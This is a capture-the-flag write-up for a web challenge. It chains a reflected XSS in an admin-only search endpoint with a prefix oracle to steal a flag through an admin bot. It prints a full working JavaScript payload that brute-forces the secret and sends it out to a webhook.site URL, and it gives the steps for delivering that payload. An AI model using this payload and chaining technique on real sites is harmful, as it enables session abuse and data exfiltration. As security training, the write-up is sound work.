# Leaky CTF Platform — Writeup

## Challenge Info

| Field | Value |
|---|---|
| **Challenge Name** | Leaky CTF Platform |
| **Author** | siunam |
| **Category** | Web Exploitation |
| **Description** | Yet another XS-Leaks challenge inspired by an unintended solution from a challenge that I almost solved. |

---

## TL;DR

This challenge provides a **report system with an admin bot** that visits user-supplied URLs.

The application also exposes an **admin-only `/search` endpoint** that reflects user input into the HTML response without escaping.

By injecting **JavaScript through the `/search` endpoint**, we can execute code in the **admin bot’s browser context**, which includes the admin cookie.

Using this, we:

1. Used the `/search` endpoint as a **prefix oracle**
2. Brute-forced the hidden flag `leakyctf{xxxxxxxx}`
3. Submitted it to `/submit_flag`
4. Exfiltrated the real flag (`PUCTF26{...}`) to a webhook.

---

## Final Flag

```
PUCTF26{REDACTED} definitely not because i forgor to save the flag before submitting it :sob:
```

---

## Solution Overview

The solving process:

1. Review the provided source code
2. Identify the admin-only `/search` endpoint
3. Notice that user input is reflected into HTML
4. Observe the admin bot behavior
5. Inject JavaScript through the `/search` endpoint
6. Use the endpoint as a prefix oracle
7. Recover the hidden flag
8. Submit it to retrieve the real flag

---

# 1. Source Code Inspection

The provided source code includes several endpoints:

```
/
 /search
 /spam_flags
 /submit_flag
 /report
```

The important functionality is inside `/search`.

---

## Admin Check

The `/search` endpoint checks for an admin cookie:

```python
if request.cookies.get('admin_secret', '') != config.ADMIN_SECRET:
    return 'Access denied. Only admin can access this endpoint.', 403
```

This means only the **admin bot** can access this endpoint successfully.

---

## Reflected Input

The endpoint returns:

```python
return f'"{flag}" found in our key-value store.'
```

The `flag` parameter is directly inserted into the HTML response.

Because it is not escaped, we can inject **HTML or JavaScript**.

Example:

```html
<script>alert(1)</script>
```

This creates a **Cross-Site Scripting (XSS)** vulnerability.

---

# 2. Understanding the Admin Bot

The challenge includes an admin bot implemented with **Playwright**.

From `bot.py`:

```python
await context.add_cookies([{
    'name': 'admin_secret',
    'value': ADMIN_SECRET,
    'domain': BOT_CONFIG['APP_DOMAIN'],
    'path': '/',
    'httpOnly': True,
    'sameSite': 'Lax',
}])
```

The bot:

1. Sets the **admin cookie**
2. Visits the attacker-supplied URL
3. Waits **60 seconds**

```python
await asyncio.sleep(BOT_CONFIG['VISIT_SLEEP_SECOND'])
```

This means any injected script has enough time to execute.

---

# 3. Flag Storage

Flags are stored in memory:

```python
flags = [config.CORRECT_FLAG]
```

The correct flag is generated as:

```python
CORRECT_FLAG = f'leakyctf{{{secrets.token_hex(4)}}}'
```

Example:

```
leakyctf{a1b2c3d4}
```

---

## Prefix Oracle

The `/search` endpoint checks:

```python
any(f for f in flags if f.startswith(flag))
```

This means we can test **prefixes** of the correct flag.

If the prefix is correct:

```
"<prefix>" found in our key-value store.
```

Otherwise:

```
"<prefix>" not found in our key-value store.
```

This creates a **prefix oracle** that allows brute-forcing the flag character by character.

---

# 4. Exploiting the XSS

We inject JavaScript that runs inside the admin bot’s browser.

The script:

1. Iterates over hex characters
2. Queries `/search`
3. Detects whether the prefix is correct
4. Recovers the full flag
5. Submits it to `/submit_flag`
6. Sends the result to a webhook

Payload:

```javascript
<script>
(async()=>{
let HEX="0123456789abcdef";
let cur="leakyctf{";

for(let i=0;i<8;i++){
  for(let c of HEX){
    let guess=cur+c;
    let r=await fetch("/search?flag="+encodeURIComponent(guess),{credentials:"include"});
    let t=await r.text();
    if(t.includes('"'+guess+'" found')){
        cur=guess;
        break;
    }
  }
}

cur+="}";

let r2=await fetch("/submit_flag?flag="+encodeURIComponent(cur),{credentials:"include"});
let real=await r2.text();

(new Image()).src="https://webhook.site/YOUR-ID?data="+encodeURIComponent(real);
})();
</script>
```

---

# 5. Delivering the Payload

The script is URL encoded and sent through the report system:

```
http://chal.polyuctf.com:45680/report
```

Example attack URL:

```
http://localhost:5000/search?flag=<payload>
```

After submitting the URL and solving the captcha, the admin bot visits the page.

---

# 6. Receiving the Flag

After approximately **60 seconds**, the webhook receives a request containing:

```
Correct! The real flag is: PUCTF26{...}
```

---

# Key Takeaways

- Reflecting user input directly into HTML can lead to XSS
- Admin bots can be abused when they visit attacker-controlled URLs
- Prefix checks can unintentionally create **oracle leaks**
- Combining XSS with an oracle can lead to full secret recovery
- Web exploitation often involves chaining multiple small issues

---

# Commands / Snippets Used

### Webhook Setup

Used:

```
https://webhook.site
```

to receive the exfiltrated flag.

---

### Payload Delivery

Submit the encoded payload through:

```
/report
```

which triggers the admin bot to visit the malicious URL.

---

# Closing Thoughts

This challenge nicely combines several common web exploitation concepts:

- **XSS**
- **admin bot abuse**
- **oracle-based information leaks**

Individually, each component might seem harmless, but when chained together they allow full recovery of the hidden flag.

It demonstrates how small design decisions—like reflecting user input or using prefix checks—can unintentionally create powerful attack primitives when combined.
